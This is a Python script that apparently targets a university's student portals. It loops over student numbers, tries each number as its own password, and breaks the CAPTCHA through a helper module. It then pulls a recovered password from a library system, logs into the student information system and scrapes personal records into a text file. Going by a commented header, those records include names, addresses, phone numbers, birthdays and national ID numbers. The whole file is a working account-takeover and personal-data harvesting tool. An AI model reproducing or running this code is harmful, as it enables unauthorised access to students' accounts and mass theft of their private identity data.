# -*- coding: utf-8 -*-
import valid
import re
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import hashlib
from bs4 import BeautifulSoup
def GetVIEWSTATE():
    url_login="http://stu.njupt.edu.cn/login.aspx"
    request=urllib.request.Request(url_login)
    response=urllib.request.urlopen(request)
    reg=r'value="(.{124})"'
    imgre=re.compile(reg)
    imlist=re.findall(imgre,response.read().decode())
    Str="".join(imlist)#把list转化成字符串
    return Str
 

def MD5_Big(str):
    m=hashlib.md5()#创建MD5对象
    m.update(str.encode('utf-8'))#生成加密串
    psw=m.hexdigest()#获取加密串
    return psw.upper()

def FormData(view,user,password):
    #登录界面的url
    url='http://stu.njupt.edu.cn/login.aspx'
    Uinformation='http://stu.njupt.edu.cn/txxm/rsbulid/r_3_3_st_jbxg.aspx?xq=2016-2017-2&nd=2013'
    #需要post的数据
    Form_Data={
           '__VIEWSTATE': view,
           '__VIEWSTATEGENERATOR':'C2EE9ABB',
           'userbh': user,
           'pass':password,
           'cw': "",
           'xzbz': '1',
           }
    Form_Data=urllib.parse.urlencode(Form_Data).encode('utf-8')
    #设置cookie存储
    cookie=http.cookiejar.CookieJar()
    handler=urllib.request.HTTPCookieProcessor(cookie)
    opener1=urllib.request.build_opener(handler)
    
    req=urllib.request.Request(url=url,data=Form_Data)
    response=opener1.open(req)
    res=opener1.open(Uinformation)
    return res.read().decode('utf-8')

def GetInf(html,match=''):
    
    soup=BeautifulSoup(html,'lxml')
    #names=soup.find_all(id="y_xm")#只单独搜索姓名的soup
    names=soup.find_all('span')
    names = [name.text for name in names ]
    try:
        for i in range(0,30):
            List_Student.append(names[i])
    except IndexError:
        print("改密码了")
    return List_Student
    
#主函数    
if __name__=="__main__":
    global List_Student
    #写入文件格式
    fin=open("information.txt",'w')
    #fin.writelines("    学号         姓名      性别       专业          住宿地址            手机号            生日              身份证号                考生号              毕业学校           智慧校园卡号\n\n")
    
    #对图书管理系统的爬取
    f=open("C:\\Users\\john\\Desktop\\validCode-master\\s.txt","r")
    lines=f.readlines()#读取全部内容
                #List_Student=[]#学生列表，存储获取到的信息
            #List_Student.append(ID)
    for line in lines:
        List_Student=[]
        ID=line[0:9]
        PW=line[0:9]
        global password_6
        for i in range(5):
            x=valid.Identify_Code()
            password_6=valid.search(valid.login(x,ID,PW))
            if password_6:
                break    
        #password返回为空所以无法登陆
        if password_6!=None:
            #对奥蓝系统的爬取
            for i in range(5):
                viewstate=GetVIEWSTATE()
                s=MD5_Big(password_6)
                data=FormData(viewstate,ID,s)
                name=GetInf(data)
                if name!=[]:
                    #print(name)
                    break
        #写入文件
        for i in range(len(List_Student)):
            fin.writelines("%s       " %List_Student[i])
        fin.writelines("\n")
    fin.close()